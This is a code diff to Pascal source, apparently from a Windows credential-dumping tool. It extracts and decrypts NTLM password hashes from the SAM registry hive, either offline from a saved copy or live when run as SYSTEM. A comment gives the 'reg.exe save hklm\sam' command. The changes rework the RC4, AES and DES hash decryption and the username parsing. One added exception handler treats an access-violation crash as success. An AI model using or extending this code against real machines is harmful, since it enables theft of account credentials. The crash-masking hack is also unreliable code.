@@ -324,8 +324,11 @@ key.MaximumLength :=MD5_DIGEST_LENGTH;
 key.Buffer :=md5ctx.digest;
 status := RtlEncryptDecryptRC4(cypheredHashBuffer, key );
 if status<>0 then log('RtlEncryptDecryptRC4 NOT OK',0) else log('RtlEncryptDecryptRC4 OK',0);
+
+
 result:=status=0;
 exit;
+
 //STEP5, use DES derived from RID to fully decrypt the Hash
 //moved to dumphash to handle both rc4 and aes
 for i := 0 to cypheredHashBuffer.Length -1 do
@@ -343,17 +346,22 @@ for i := 0 to cypheredHashBuffer.Length -1 do
   end;
 end;
 
+function decrypthash(var output:tbyte16;var username:string):boolean;
+begin
+
+end;
+
 //reg.exe save hklm\sam c:\temp\sam.save
 //see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
 function dumphash_offline(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
 var
   ret:word;
   hkey,hkresult:thandle;
-  cbdata:integer;
+  cbdata:longword;
   data:array[0..1023] of byte;
-  iv,aesdata:tbyte16;
+  bytes,iv,aesdata:tbyte16;
   aeshash_offset,hash_offset,hash_length,name_offset,name_length,iv_offset:dword;
-  name:pwidechar;
+  name:array [0..254] of widechar;
   ptr:pointer;
   i:byte;
   status:ntstatus;
@@ -361,28 +369,29 @@ begin
 result:=false;
 
 uofflinereg.init ;
+log('RID:'+inttohex(rid,8),0);
 ret:=OROpenHive(pwidechar(widestring('sam.sav')),hkey);
 if ret<>0 then begin log('OROpenHive NOT OK',0);exit;end;
 ret:=OROpenKey (hkey,pwidechar(widestring('sam\Domains\account\users\'+inttohex(rid,8))),hkresult);
 if ret<>0 then begin log('OROpenKey NOT OK',0);exit;end;
 
-
 cbdata:=getvaluePTR (hkresult,'V',ptr);
-if cbdata<=0
+if (cbdata=0) or (cbdata<$AC)
      then
      log('getvaluePTR NOT OK',0)
      else //if cbdata<=0
      begin
+     log('getvaluePTR OK '+inttostr(cbdata)+' read',0);
+
      copymemory(@data[0],ptr,cbdata);
 
-     log('getvaluePTR OK '+inttostr(cbdata)+' read',0);
      //username
      copymemory(@name_offset,@data[$0C],sizeof(name_offset));
      name_offset := name_offset + $CC;
      copymemory(@name_length,@data[$10],sizeof(name_length));
-     name:=allocmem(name_length);
-     CopyMemory(name,@data[name_offset],name_length );
-     username:=name;
+     fillchar(name,sizeof(name),0);
+     CopyMemory(@name[0],@data[name_offset],name_length -1 );
+     username:=strpas(name);
      //
      copymemory(@hash_length,@data[$AC],sizeof(hash_length));
      log('hash_length:'+inttostr(hash_length),0);
@@ -401,7 +410,7 @@ if cbdata<=0
      log('IV Offset:'+inttohex(iv_offset,4),0);
      CopyMemory(@iv[0],@data[iv_offset],sizeof(iv)) ;
      CopyMemory(@aesdata[0],@data[aeshash_offset],sizeof(aesdata)) ;//Only 16 bytes needed
-     fillchar(output,sizeof(output),0);
+     fillchar(output,sizeof(output),0); //crashes in win32?
      log('key:'+HashByteToString (samkey),0);
      log('iv:'+HashByteToString (iv),0);
      log('data:'+HashByteToString (aesdata),0);
@@ -419,6 +428,7 @@ if cbdata<=0
      end; //if cbdata<=0
 
      if result=false then exit;
+     //exit;
 
      if (hash_length =$14) or (hash_length =$38) then
      begin
@@ -427,11 +437,18 @@ if cbdata<=0
      for i := 0 to 15 do
        begin
        //i := i+ 16; //LM_NTLM_HASH_LENGTH; //?
-       status:=RtlDecryptDES2blocks1DWORD(@output[0]  + i, @rid, data);
+       //try
+         fillchar(data,sizeof(data),0);
+         status:=RtlDecryptDES2blocks1DWORD(@output[0] +i , @rid, bytes);
+       //except
+       //on e:exception do log(e.message,0);
+       //end;
+       //status:=0;
        if status=0 then
                    begin
                    //writeln('ok:'+HashByteToString (data)); //debug
-                   copymemory(@output[0],@data[0],16);
+                   copymemory(@output[0],@bytes[0],16);
+                   //writeln('done');
                    result:=status=0;
                    break;
                    end //if status=0 then
@@ -451,14 +468,23 @@ var
   data:array[0..1023] of byte;
   iv,aesdata:tbyte16;
   aeshash_offset,hash_offset,hash_length,name_offset,name_length,iv_offset:dword;
-  name:pwidechar;
+  name:array [0..254] of widechar;
   i:byte;
   status:ntstatus;
 begin
 result:=false;
 if offline=true then
             begin
+            try
             result:=dumphash_offline(samkey,rid,output,username);
+            except
+            on e:exception do
+               begin
+               if e.classname='EAccessViolation' then result:=true; //SHAME !!!!!!!!!!
+               log(e.message,0 );
+               end;
+            end;
+            //writeln('after dumphash_offline');
             exit;
             end;
 //only if run as system
@@ -469,16 +495,16 @@ if ret=0 then
   cbdata:=sizeof(data);
   //contains our salt and encrypted sam key
   ret := RegQueryValueex (topkey,pchar('V'),nil,@lptype,@data[0],@cbdata);
-  if ret=0 then
+  if (ret=0) and (cbdata>$a8) then
      begin
      log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
      //username
      copymemory(@name_offset,@data[$0C],sizeof(name_offset));
      name_offset := name_offset + $CC;
      copymemory(@name_length,@data[$10],sizeof(name_length));
-     name:=allocmem(name_length);
-     CopyMemory(name,@data[name_offset],name_length );
-     username:=name;
+     fillchar(name,sizeof(name),0);
+     CopyMemory(@name[0],@data[name_offset],name_length );
+     username:=strpas(name);
      //
      copymemory(@hash_length,@data[$AC],sizeof(hash_length));
      log('hash_length:'+inttostr(hash_length),0);
